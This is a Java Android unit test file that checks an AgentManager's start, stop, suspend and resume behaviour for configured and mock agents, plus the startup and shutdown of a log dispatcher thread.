package com.android.service.test;

import java.util.HashMap;

import android.content.res.Resources;
import android.test.AndroidTestCase;
import android.test.MoreAsserts;
import android.util.Log;

import com.android.service.Device;
import com.android.service.LogDispatcher;
import com.android.service.GeneralException;
import com.android.service.Status;
import com.android.service.agent.BaseAgent;
import com.android.service.agent.AgentConf;
import com.android.service.agent.AgentFactory;
import com.android.service.agent.AgentManager;
import com.android.service.conf.Configuration;
import com.android.service.mock.AgentMockFactory;
import com.android.service.mock.MockAgent;
import com.android.service.util.Utils;

public class AgentManagerTest extends AndroidTestCase {
	Status status;

	protected void setUp() throws Exception {
		super.setUp();
		status = Status.self();
		Status.setAppContext(getContext());
		status = Status.self();
		status.clean();
		status.unTriggerAll();
		AgentManager agentManager = AgentManager.self();
		agentManager.stopAll();
	}

	protected void tearDown() throws Exception {
		super.tearDown();
	}

	public void testAgentsStart() throws InterruptedException, GeneralException {
		Resources resources = getContext().getResources();
		// Start agents
		AgentManager agentManager = AgentManager.self();
		agentManager.setFactory(new AgentFactory());

		final byte[] resource = Utils.inputStreamToBuffer(
				resources.openRawResource(R.raw.config), 8); // config.bin

		// Initialize the configuration object
		final Configuration conf = new Configuration(resource);

		// Identify the device uniquely
		final Device device = Device.self();

		// Load the configuration
		conf.loadConfiguration(true);

		// Start log dispatcher
		final LogDispatcher logDispatcher = LogDispatcher.self();
		logDispatcher.start();

		HashMap<String, BaseAgent> agentsMap = agentManager.getRunning();
		BaseAgent[] agentsList = agentsMap.values().toArray(new BaseAgent[] {});
		MoreAsserts.assertEmpty(agentsMap);

		agentManager.startAll();
		Utils.sleep(2000);

		agentsMap = agentManager.getRunning();
		MoreAsserts.assertNotEmpty(agentsMap);
		agentsList = agentsMap.values().toArray(new BaseAgent[] {});
		for (BaseAgent agent : agentsList) {
			assertTrue(agent.isRunning());
		}
		assertEquals(1, agentsList.length);
		/*
		 * agentManager.stopAgent(Agent.AGENT_DEVICE); Utils.sleep(2000);
		 * agentManager.startAgent(Agent.AGENT_DEVICE); Utils.sleep(2000);
		 * agentManager.restartAgent(Agent.AGENT_DEVICE); Utils.sleep(2000);
		 */
		// Stop agents
		agentManager.stopAll();
		Utils.sleep(2000);

		for (BaseAgent agent : agentsList) {
			assertTrue(!agent.isRunning());
		}

		// Ci stiamo chiudendo
		logDispatcher.halt();
		logDispatcher.join();

		Log.d("RCS", "LogDispatcher Killed");
	}

	public void testAgentSuspend() throws GeneralException {
		MockAgent agent;
		String type= "log";
		AgentManager manager = AgentManager.self();
		manager.setFactory(new AgentMockFactory());
		
		AgentConf conf = new AgentConf(type, null);
		status.addAgent(conf);

		manager.startAll();
		Utils.sleep(1000);

		agent = (MockAgent) manager.get(type);
		assertNotNull(agent);

		assertEquals(1, agent.initialiazed);
		assertEquals(1, agent.parsed);
		assertEquals(1, agent.went);
		assertEquals(0, agent.ended);

		agent.suspend();
		Utils.sleep(1000);

		assertEquals(1, agent.initialiazed);
		assertEquals(1, agent.parsed);
		assertEquals(1, agent.went);
		assertEquals(0, agent.ended);

		agent.resume();
		Utils.sleep(1000);

		assertEquals(1, agent.initialiazed);
		assertEquals(1, agent.parsed);
		assertEquals(2, agent.went);
		assertEquals(0, agent.ended);

		manager.stopAll();
		Utils.sleep(1000);

		assertEquals(1, agent.initialiazed);
		assertEquals(1, agent.parsed);
		assertEquals(2, agent.went);
		assertEquals(1, agent.ended);

		agent = (MockAgent) manager.get(type);
		assertNull(agent);
	}
}
